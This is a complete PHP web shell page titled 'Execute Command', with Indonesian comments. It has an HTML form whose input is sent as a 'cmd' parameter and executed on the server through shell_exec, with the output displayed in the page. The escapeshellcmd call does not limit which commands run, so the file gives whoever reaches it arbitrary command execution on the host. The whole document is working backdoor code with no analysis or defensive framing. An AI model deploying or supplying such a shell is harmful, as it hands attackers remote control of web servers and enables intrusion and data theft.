<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
    <script>
        function executeCommand(event) {
            event.preventDefault(); // Mencegah formulir dari pengiriman normal

            var cmd = document.getElementById('cmd').value;
            var xhr = new XMLHttpRequest();
            xhr.open('GET', '?cmd=' + encodeURIComponent(cmd), true);

            xhr.onload = function () {
                if (xhr.status >= 200 && xhr.status < 300) {
                    document.getElementById('output').innerHTML = xhr.responseText;
                } else {
                    document.getElementById('output').innerHTML = 'Error: ' + xhr.statusText;
                }
            };

            xhr.onerror = function () {
                document.getElementById('output').innerHTML = 'Request failed';
            };

            xhr.send();
        }
    </script>
</head>
<body>
    <form onsubmit="executeCommand(event)">
        <input type="TEXT" name="cmd" id="cmd" autofocus size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre id="output">
<?php
    if (isset($_GET['cmd'])) {
        // Mendapatkan perintah dari parameter 'cmd'
        $command = escapeshellcmd($_GET['cmd']);
        
        // Menjalankan perintah dan menangkap outputnya
        $output = shell_exec($command . ' 2>&1');
        
        // Menampilkan output dengan aman
        echo htmlspecialchars($output);
    }
?>
    </pre>
</body>
</html>
